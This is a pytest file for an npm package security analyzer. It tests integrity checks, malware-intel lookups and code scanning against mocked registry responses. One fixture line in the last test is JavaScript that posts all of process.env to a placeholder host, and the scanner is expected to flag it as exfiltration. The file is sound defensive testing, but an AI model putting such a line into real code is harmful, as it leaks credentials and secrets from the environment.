import base64
import hashlib
from datetime import UTC, datetime

import httpx
from helpers import make_packument, make_tgz, manifest_json

from pkgguard_analyzer.analyze import analyze, parse_spec
from pkgguard_analyzer.intel import OSV_QUERY_URL, SAFEDEP_QUERY_URL
from pkgguard_analyzer.schema import ScanStatus, Verdict

NOW = datetime(2026, 9, 17, tzinfo=UTC)
TARBALL_URL = "https://registry.npmjs.org/demo-pkg/-/demo-pkg-1.0.0.tgz"


def mock_client(tarball: bytes, integrity: str, osv: dict | None = None, safedep: dict | None = None) -> httpx.Client:
    packument = make_packument(integrity=integrity, tarball=TARBALL_URL)

    def handler(request: httpx.Request) -> httpx.Response:
        url = str(request.url)
        if url == "https://registry.npmjs.org/demo-pkg":
            return httpx.Response(200, json=packument)
        if url == TARBALL_URL:
            return httpx.Response(200, content=tarball)
        if url == OSV_QUERY_URL:
            return httpx.Response(200, json=osv or {})
        if url == SAFEDEP_QUERY_URL:
            return httpx.Response(200, json=safedep or {"report": {"inference": {"isMalware": False}}})
        return httpx.Response(404)

    return httpx.Client(transport=httpx.MockTransport(handler))


def sri(data: bytes) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


def test_clean_package_end_to_end(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": "module.exports = 1"})
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW)
    assert result.record.status == ScanStatus.COMPLETE
    assert result.record.verdict == Verdict.SAFE
    assert result.record.sha256 == hashlib.sha256(tarball).hexdigest()
    assert result.report.metadata["fileCount"] == 2
    assert (tmp_path / "demo-pkg" / "1.0.0" / "files" / "index.js").exists()


def test_known_malicious_package(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json()})
    client = mock_client(tarball, sri(tarball), osv={"vulns": [{"id": "MAL-2026-1"}]})
    result = analyze("demo-pkg", "1.0.0", out_dir=tmp_path, client=client, now=NOW)
    assert result.record.verdict == Verdict.MALICIOUS


def test_tampered_tarball_fails_scan(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json()})
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(b"something else")), now=NOW)
    assert result.record.status == ScanStatus.FAILED
    assert "integrity" in result.record.failure_reason
    assert result.report is None


def test_intel_outage_does_not_stop_scan(tmp_path):
    tarball = make_tgz({"package/package.json": manifest_json()})
    packument = make_packument(integrity=sri(tarball), tarball=TARBALL_URL)

    def handler(request):
        url = str(request.url)
        if url == "https://registry.npmjs.org/demo-pkg":
            return httpx.Response(200, json=packument)
        if url == TARBALL_URL:
            return httpx.Response(200, content=tarball)
        return httpx.Response(503)

    result = analyze("demo-pkg", out_dir=tmp_path, client=httpx.Client(transport=httpx.MockTransport(handler)), now=NOW)
    assert result.record.status == ScanStatus.COMPLETE
    assert "error" in result.report.intel["osv"]


def test_parse_spec():
    assert parse_spec("express") == ("express", None)
    assert parse_spec("express@4.18.2") == ("express", "4.18.2")
    assert parse_spec("@babel/core") == ("@babel/core", None)
    assert parse_spec("@babel/core@7.24.0") == ("@babel/core", "7.24.0")


def test_suspicious_code_changes_verdict(tmp_path):
    tarball = make_tgz(
        {
            "package/package.json": manifest_json(),
            "package/index.js": 'const h = require("https"); h.request({host: "collector.invalid"}).end(JSON.stringify(process.env));',
        }
    )
    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW)
    assert result.record.verdict == Verdict.SUSPICIOUS
    assert any(f.rule_id == "code.exfiltration" for f in result.report.findings)
    assert result.report.code_scan["filesScanned"] == 1
